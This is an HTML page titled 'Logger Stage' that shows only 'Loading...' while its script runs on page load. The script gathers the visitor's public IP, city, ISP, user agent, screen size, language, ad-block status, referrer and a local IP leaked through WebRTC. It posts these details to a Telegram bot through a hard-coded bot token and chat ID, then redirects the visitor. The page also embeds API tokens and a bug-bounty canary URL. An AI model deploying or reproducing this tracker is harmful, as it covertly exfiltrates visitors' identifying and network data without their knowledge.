<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Logger Stage</title>
  <script>
    const TELEGRAM_TOKEN = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
    const TELEGRAM_CHAT_ID = "6239813037";
    const REDIRECT_URL = "https://www.internalfb.com/intern/bug-bounty/get-canary-token/4659208263424b568dc09729f50d3637/";

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
        return await res.json();
      } catch {
        return {};
      }
    }

    function detectPlatform() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) return "Android";
      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
      if (/Win/.test(ua)) return "Windows";
      if (/Mac/.test(ua)) return "MacOS";
      if (/Linux/.test(ua)) return "Linux";
      return "Unknown";
    }

    async function detectAdBlock() {
      return new Promise(resolve => {
        const testAd = document.createElement("div");
        testAd.className = "adsbox";
        testAd.style.position = "absolute";
        testAd.style.height = "1px";
        document.body.appendChild(testAd);
        setTimeout(() => {
          resolve(testAd.offsetHeight === 0);
          document.body.removeChild(testAd);
        }, 100);
      });
    }

    function detectWebRTCLocalIP() {
      return new Promise(resolve => {
        let found = false;
        const pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
          if (event && event.candidate && event.candidate.candidate) {
            const parts = event.candidate.candidate.split(" ");
            const ip = parts[4];
            if (/^(192\.|10\.|172\.)/.test(ip)) {
              found = true;
              resolve(ip);
              pc.close();
            }
          }
        };
        setTimeout(() => {
          if (!found) resolve("N/A");
          pc.close();
        }, 3000);
      });
    }

    async function sendToTelegram(message) {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        await fetch(url, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown"})
        });
      } catch {}
    }

    function formatMessage(data) {
      return `ğŸ“„ *[LOGGER STAGE]*\n
ğŸŒ *IP:* ${data.ip || "Unknown"}
ğŸ“ *City:* ${data.city || "Unknown"}
ğŸŒ *Country:* ${data.country || "Unknown"}
ğŸ¢ *ISP:* ${data.org || "Unknown"}
ğŸ–¥ *Platform:* ${data.platform}
ğŸ“± *Resolution:* ${data.resolution}
ğŸŒ *Language:* ${data.language}
ğŸ§  *User-Agent:* \`${data.ua}\`
ğŸ›¡ *AdBlock:* ${data.adblock ? "Yes" : "No"}
ğŸ“¡ *WebRTC Local IP:* ${data.localIP}
ğŸ”— *Referrer:* ${document.referrer || "Direct"}
ğŸ•’ *Timestamp:* ${new Date().toLocaleString()}`;
    }

    async function run() {
      const ipData = await getIPInfo();
      const ua = navigator.userAgent;
      const res = `${window.screen.width}x${window.screen.height}`;
      const lang = navigator.language;
      const platform = detectPlatform();
      const adblock = await detectAdBlock();
      const localIP = await detectWebRTCLocalIP();

      const msg = formatMessage({
        ...ipData, ua, resolution: res, language: lang,
        platform, adblock, localIP
      });

      await sendToTelegram(msg);
      window.location.href = "redirect_ultimate.html";
    }

    window.onload = run;
  </script>
</head>
<body>
  <h1>Loading...</h1>
</body>
</html>
